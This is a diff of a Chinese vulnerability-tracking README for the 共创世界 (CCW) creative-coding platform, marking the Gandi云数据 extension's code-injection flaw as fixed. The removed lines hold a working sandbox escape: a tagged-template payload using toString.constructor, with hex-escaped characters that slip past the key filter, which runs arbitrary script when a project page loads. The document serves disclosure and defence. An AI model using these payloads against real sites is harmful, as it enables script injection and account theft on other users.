@@ -2,7 +2,7 @@
 
 记录共创世界的前端代码注入漏洞、可能的盗号方式和防护方式建议。
 
-更新时间：北京时间 2026年5月17日 13:51
+更新时间：北京时间 2026年5月23日 12:38
 
 该仓库创建于北京时间 2026年2月10日 ，此前被修复的漏洞可能没有记录。  
 
@@ -183,180 +183,39 @@ Content-Security-Policy: script-src 'none';
 
 ## CCWData
 
-状态：⚠️未修复  
+状态：✅已修复  
 
-扩展显示名称：Gandi云数据
+Gandi云数据扩展 (CCWData) 已于北京时间 2026年5月21日 16:50:39 修复前端代码注入漏洞。
 
-该扩展有代码注入漏洞，且官方从未真正修复它，而是将它们标记为 `（❌过时的积木）` ，然后隐藏起来，因此仍然可以被利用，且不会触发任何警告。  
+参考js文件 [20260521.scratch3_ccw_data.9ff72c43.prettyprint.js](20260521.scratch3_ccw_data.9ff72c43.prettyprint.js)
 
-2026 年 3 月 9 日，官方修改了代码注入漏洞积木的逻辑，但并没有修复漏洞，攻击者仍然能拿到全局 `window` 对象，仍然可以[从 React 提取 scratch-vm](https://github.com/bddjr/getScratchVMFromReact) 。
+[查看旧版逻辑](./ccwdata-before-20260521-165039.md)  
 
-如果您需要回滚到修改前的行为，请用 [CCWData-polyfill-eval](https://github.com/bddjr/CCWData-polyfill-eval) 。
-
-如果您想看旧版逻辑，请看 [before-20260309.md](before-20260309.md) 。
-
-参考逆向代码文件 [20260309.scratch3_ccw_data.e7237e1f.prettyprint.js](20260309.scratch3_ccw_data.e7237e1f.prettyprint.js) 。
-
-修复方法参考 [CCWData-Code-Injection-Fix](https://github.com/bddjr/CCWData-Code-Injection-Fix) 。  
-
-### getValueInJSON
+修复后，相关积木会直接调用新版的积木。相关代码如下  
 
 ```js
 {
     key: "getValueInJSON",
     value: function(t) {
-        var e, r = u().toString(t.KEY), a = u().toString(t.JSON);
-        try {
-            e = JSON.parse(a)
-        } catch (t) {
-            return "error: ".concat(t.message)
-        }
-        if (/[()=]/gm.test(r))
-            return "error: invalid key ".concat(r, ", cannot contain ()=");
-        var n, o = "jsonObj[".concat(r, "]");
-        Array.isArray(e) ? r = r.startsWith("[") ? "jsonObj".concat(r) : "jsonObj[".concat(r, "]") : /\s/gm.test(r) ? (console.warn("[CCW Data] warning: invalid key ".concat(r, ", space and dot cannot be used together")),
-        r = 'jsonObj["'.concat(r, '"]')) : r = "jsonObj.".concat(r);
-        try {
-            n = (0,
-            y.Br)("return ".concat(r), {
-                jsonObj: e
-            })
-        } catch (t) {
-            try {
-                n = (0,
-                y.Br)("return ".concat(o), {
-                    jsonObj: e
-                })
-            } catch (t) {
-                return "error: key or expression invalid"
-            }
-        }
-        return "object" === g(n) ? JSON.stringify(n) : n
+        this.doNotLogError = !0;
+        var e = this.getValueInJSON_2(t);
+        return this.doNotLogError = !1,
+        e
     }
 }
 ```
-
-其中 `y.Br` 会调用另一个函数
-
-```js
-function p(t) {
-    var e = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}
-        , r = ["fetch", "XMLHttpRequest", "WebSocket", "EventSource", "Worker", "alert", "confirm", "prompt", "setTimeout", "setInterval", "Function", "Image", "Audio", "Video", "open"]
-        , n = {}
-        , o = window.Function;
-    r.forEach((function(t) {
-        n[t] = window[t],
-        window[t] = null
-    }
-    ));
-    try {
-        var c = Object.keys(e)
-            , i = Object.values(e)
-            , s = '\n      "use strict";\n      const globalThis = null;\n      const window = null;\n      const document = null;\n      const alert = null;\n      const confirm = null;\n      const prompt = null;\n      const fetch = null;\n      const XMLHttpRequest = null;\n      const localStorage = null;\n      const sessionStorage = null;\n      const Image = null;\n      const Audio = null;\n      const Video = null;\n      const Worker = null;\n      const Function = null;\n      const open = null;\n      const history = null;\n      const location = null;\n      const navigator = null;\n      const global = null;\n      const self = null;\n      const top = null;\n      const parent = null;\n      const console = null;\n      '.concat(t)
-            , u = a(o, c.concat([s]));
-        return u.apply(void 0, i)
-    } finally {
-        r.forEach((function(t) {
-            window[t] = n[t]
-        }
-        ))
-    }
-}
-```
-
-乍一看好像没啥问题，把 `key` 的 `()=` 这几个符号都过滤掉了，而且还把一些变量设为 null ，看起来好像没办法执行什么函数了……吗？  
-
-ECMAScript 2015 新增了模板字符串功能，模板字符串可以执行函数，例如：
-
-```js
-String.raw`C:\Development\profile\aboutme.html`
-```
-
-经过我的研究，因为它输入给函数的参数0是一个数组，所以它不能直接调用 `eval` 执行字符串，  
-但它可以调用 `Function` 以创建函数，然后执行函数。  
-`Function` 函数可以通过读取函数的 `.constructor` 获得，例如 `toString.constructor` 。  
-
-```js
-toString.constructor`window.Function=toString.constructor;var msg='注入代码测试';console.log(msg,arguments)``${jsonObj}`
-```
-
-只需要将字符串里的部分字符按照以下形式替换，就能绕过正则表达式的过滤：
-
-> `(` -> `\x28`  
-> `)` -> `\x29`  
-> `=` -> `\x3d`  
-> ` ` -> `\x20`  
-
-于是我们就得到了：
-
-```js
-toString.constructor`window.Function\x3dtoString.constructor;var\x20msg\x3d'注入代码测试';console.log\x28msg,arguments\x29``${jsonObj}`
-```
-
-将这行代码填入 `args.KEY` 里，就可以执行想要的操作了。
-
-当然了，返回值的类型仍受限制，您可以尝试重写 `JSON.stringify` 以返回对象。  
-
-```js
-window.Function = toString.constructor;
-const jsonObj = arguments[1];
-// 返回 rtObj 对象
-const rtObj = {
-    jsonObj,
-    "114": "514"
-};
-const { stringify } = JSON;
-JSON.stringify = function(o) {
-    return o === rtObj ? (JSON.stringify = stringify, o) : stringify.apply(this, arguments)
-};
-return rtObj
-```
-
-```js
-toString.constructor`window.Function\x3dtoString.constructor;const\x20jsonObj\x3darguments[1];const\x20rtObj\x3d{jsonObj,"114":"514"};const{stringify}\x3dJSON;JSON.stringify\x3dfunction\x28o\x29{return\x20o\x3d\x3d\x3drtObj?\x28JSON.stringify\x3dstringify,o\x29:stringify.apply\x28this,arguments\x29};return\x20rtObj``${jsonObj}`
-```
-
-但是一些全局变量还是被污染的，如果想要干掉全局变量污染，可以用 [CCWData-polyfill-window](https://github.com/bddjr/CCWData-polyfill-window) 。  
-
-以上方法太麻烦了，如果想要添加 eval 积木，可以用 [CodeCrackWorld-v2](https://github.com/bddjr/CodeCrackWorld-v2) 。  
-
-以上代码配合 “当计时器 > -1” 的帽子，就可以在浏览器访问 creator 或 gandi 页面的链接后立即执行任意代码，或者在其它页面点击“立即运行”时立即执行任意代码。  
-
-### setValueInJSON
 
 ```js
 {
     key: "setValueInJSON",
     value: function(t) {
-        var e, r = u().toString(t.KEY), a = u().toString(t.VALUE), n = u().toString(t.JSON);
-        try {
-            e = JSON.parse(n)
-        } catch (t) {
-            return "error: ".concat(t.message)
-        }
-        if (/[()=]/gm.test(r))
-            return "error: invalid key ".concat(r, ", cannot contain ()=");
-        var o = a;
-        if (/^[\[].*?[\]]$/gm.test(a) || /^[\{].*?[\}]$/gm.test(a))
-            try {
-                o = JSON.parse(a)
-            } catch (t) {}
-        "string" == typeof o && /^-?\d*\.?\d*$/gm.test(o) && (o = Number(o));
-        try {
-            Array.isArray(e) ? e[r] = o : /[\.\[\]]/gm.test(r) ? (0,
-            y.Br)("jsonObj.".concat(r, " = valueObj;"), {
-                jsonObj: e,
-                valueObj: o
-            }) : e[r] = o
-        } catch (t) {
-            return "error: key or expression invalid"
-        }
-        return JSON.stringify(e)
+        this.doNotLogError = !0;
+        var e = this.setValueInJSON_2(t);
+        return this.doNotLogError = !1,
+        e
     }
 }
 ```
-
-从 2026 年 3 月 9 日 起，此处的漏洞和 `getValueInJSON` 的漏洞一致。
 
 ---
 
